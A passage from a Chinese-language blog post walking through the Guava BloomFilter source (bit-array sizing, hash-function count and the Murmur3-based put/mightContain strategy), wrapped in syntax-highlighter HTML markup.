class=\"crayon-v\">numHashFunctions</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">funnel</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">strategy</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1af367419291-22\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">catch</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-i\">IllegalArgumentException</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">e</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1af367419291-23\"><span class=\"crayon-h\">      </span><span class=\"crayon-st\">throw</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">IllegalArgumentException</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"Could not create BloomFilter of \"</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">numBits</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\" bits\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">e</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1af367419291-24\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1af367419291-25\"><span class=\"crayon-h\">  </span><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0045 seconds] -->\r\n<p><!-- [Format Time: 0.0060 seconds] --></p>\n<p>在create中接受了4个参数，funnel（输入的数据），expectedInsertions（预计插入的元素总数），fpp（期望误判率），strategy（实现Strategy的实例），然后它计算了bit数组的长度以及哈希函数的个数（公式参考前文），最后用numBits创建了BitArray，并调用了构造函数完成赋值操作。</p>\n<p><!-- Crayon Syntax Highlighter v_2.7.2_beta --></p>\n<div id=\"crayon-5a446fa247293650434407\">\n<div>\n<div>\n<div title=\"Toggle Line Wrap\">\n<div title=\"Toggle Line Numbers\">\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f39e8bb1b4967459027\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div><span class=\"crayon-language\">Java</span></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nstatic long optimalNumOfBits(long n, double p) {\r\n    if (p == 0) {\r\n      p = Double.MIN_VALUE;\r\n    }\r\n    return (long) (-n * Math.log(p) / (Math.log(2) * Math.log(2)));\r\n  }\r\n\r\nstatic int optimalNumOfHashFunctions(long n, long m) {\r\n    // (m / n) * log(2), but avoid truncation due to division!\r\n    return Math.max(1, (int) Math.round((double) m / n * Math.log(2)));\r\n  }</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1b4967459027-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1b4967459027-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1b4967459027-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1b4967459027-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1b4967459027-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1b4967459027-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1b4967459027-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1b4967459027-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1b4967459027-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1b4967459027-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1b4967459027-11\">11</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1b4967459027-1\"><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">optimalNumOfBits</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">double</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">p</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1b4967459027-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1b4967459027-3\"><span class=\"crayon-h\">      </span><span class=\"crayon-v\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">Double</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">MIN_VALUE</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1b4967459027-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1b4967459027-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">long</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">n</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Math</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">log</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">p</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">Math</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">log</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Math</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">log</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1b4967459027-6\"><span class=\"crayon-h\">  </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1b4967459027-7\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1b4967459027-8\"><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">optimalNumOfHashFunctions</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">m</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1b4967459027-9\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// (m / n) * log(2), but avoid truncation due to division!</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1b4967459027-10\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Math</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">max</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Math</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">round</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">double</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">m</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Math</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">log</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1b4967459027-11\"><span class=\"crayon-h\">  </span><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0028 seconds] -->\r\n\n</div>\n<div title=\"Toggle Line Numbers\">接着再来看一下BloomFilterStrategies类，首先它是实现了BloomFilter.Strategy 接口的一个枚举类，其次它有两个2枚举值，MURMUR128_MITZ_32和MURMUR128_MITZ_64，分别对应了32位哈希映射函数，和64位哈希映射函数，后者使用了murmur3 hash生成的所有128位，具有更大的空间，不过原理是相通的，我们选择默认的MURMUR128_MITZ_64来分析：</div>\n<div title=\"Toggle Line Numbers\">\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f39e8bb1b8395309819\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div><span class=\"crayon-language\">Java</span></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nMURMUR128_MITZ_64() {\r\n    &lt;a href='http://www.jobbole.com/members/wx610506454'&gt;@Override&lt;/a&gt;\r\n    public &lt;T&gt; boolean put(\r\n        T object, Funnel&lt;? super T&gt; funnel, int numHashFunctions, BitArray bits) {\r\n      long bitSize = bits.bitSize();\r\n      byte[] bytes = Hashing.murmur3_128().hashObject(object, funnel).getBytesInternal();\r\n      long hash1 = lowerEight(bytes);\r\n      long hash2 = upperEight(bytes);\r\n\r\n      boolean bitsChanged = false;\r\n      long combinedHash = hash1;\r\n      for (int i = 0; i &lt; numHashFunctions; i++) {\r\n        // Make the combined hash positive and indexable\r\n        bitsChanged |= bits.set((combinedHash &amp; Long.MAX_VALUE) % bitSize);\r\n        combinedHash += hash2;\r\n      }\r\n      return bitsChanged;\r\n    }\r\n\r\n    @ Override\r\n    public &lt;T&gt; boolean mightContain(\r\n        T object, Funnel&lt;? super T&gt; funnel, int numHashFunctions, BitArray bits) {\r\n      long bitSize = bits.bitSize();\r\n      byte[] bytes = Hashing.murmur3_128().hashObject(object, funnel).getBytesInternal();\r\n      long hash1 = lowerEight(bytes);\r\n      long hash2 = upperEight(bytes);\r\n\r\n      long combinedHash = hash1;\r\n      for (int i = 0; i &lt; numHashFunctions; i++) {\r\n        // Make the combined hash positive and indexable\r\n        if (!bits.get((combinedHash &amp; Long.MAX_VALUE) % bitSize)) {\r\n          return false;\r\n        }\r\n        combinedHash += hash2;\r\n      }\r\n      return true;\r\n    }</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1b8395309819-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1b8395309819-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1b8395309819-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1b8395309819-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1b8395309819-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1b8395309819-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1b8395309819-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1b8395309819-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1b8395309819-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1b8395309819-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1b8395309819-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1b8395309819-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1b8395309819-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1b8395309819-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1b8395309819-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1b8395309819-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1b8395309819-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1b8395309819-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1b8395309819-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1b8395309819-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1b8395309819-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1b8395309819-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1b8395309819-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1b8395309819-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1b8395309819-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1b8395309819-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1b8395309819-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1b8395309819-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1b8395309819-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1b8395309819-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1b8395309819-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1b8395309819-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1b8395309819-33\">33</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1b8395309819-34\">34</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1b8395309819-35\">35</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1b8395309819-36\">36</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1b8395309819-37\">37</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1b8395309819-1\"><span class=\"crayon-e\">MURMUR128_MITZ_64</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1b8395309819-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">href</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'http://www.jobbole.com/members/wx610506454'</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-n\">@Override</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">a</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1b8395309819-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-e \">&lt;T&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">boolean</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">put</span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1b8395309819-4\"><span class=\"crayon-h\">        </span><span class=\"crayon-i\">T</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">object</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Funnel</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">super</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">T</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">funnel</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">numHashFunctions</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">BitArray </span><span class=\"crayon-v\">bits</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1b8395309819-5\"><span class=\"crayon-h\">      </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bitSize</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bits</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">bitSize</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1b8395309819-6\"><span class=\"crayon-h\">      </span><span class=\"crayon-t\">byte</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bytes</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Hashing</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">murmur3_128</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">hashObject</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">object</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">funnel</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getBytesInternal</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1b8395309819-7\"><span class=\"crayon-h\">      </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">hash1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">lowerEight</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">bytes</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1b8395309819-8\"><span class=\"crayon-h\">      </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">hash2</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">upperEight</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">bytes</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1b8395309819-9\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1b8395309819-10\"><span class=\"crayon-h\">      </span><span class=\"crayon-t\">boolean</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bitsChanged</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1b8395309819-11\"><span class=\"crayon-h\">      </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">combinedHash</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">hash1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1b8395309819-12\"><span class=\"crayon-h\">      </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">numHashFunctions</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1b8395309819-13\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">// Make the combined hash positive and indexable</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1b8395309819-14\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">bitsChanged</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bits</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">set</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">combinedHash</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">Long</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">MAX_VALUE</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bitSize</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1b8395309819-15\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">combinedHash</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">hash2</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1b8395309819-16\"><span class=\"crayon-h\">      </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1b8395309819-17\"><span class=\"crayon-h\">      </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bitsChanged</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1b8395309819-18\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1b8395309819-19\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1b8395309819-20\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">@</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Override</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1b8395309819-21\"><span class=\"crayon-e\">    </span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-e \">&lt;T&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">boolean</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">mightContain</span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1b8395309819-22\"><span class=\"crayon-h\">        </span><span 